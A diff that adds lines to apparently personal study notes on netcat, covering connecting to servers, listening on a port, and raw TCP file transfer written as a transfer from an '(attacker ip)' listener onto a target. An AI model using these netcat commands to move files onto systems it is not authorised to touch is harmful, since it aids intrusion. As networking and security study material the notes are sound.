@@ -34,6 +34,17 @@
 	- then,
 	- `GET / HTTP/1.1`
 	- `Host: example.com`
+- connecting to servers
+	- `nc -nv[u] (target-ip) (port)`
+		- u if udp 
+- listening as a server
+	- `nc -nvlp (port)`
+- file transfer (raw TCP-based file transfer without HTTP, FTP..)
+	- `nc -nv (attacker ip) (port) > (out-file)
+		- target connects to attacker's listener. the incoming stream is written into out-file on target
+	- `nc -nvlp (port) < (file)` 
+		- attacker opens a tcp listener and waits. once target connects, file gets sent to target
+	- basically, the < makes nc send a file's contents, > makes nc save received data into a file
 
 **telnet**
 - same as above
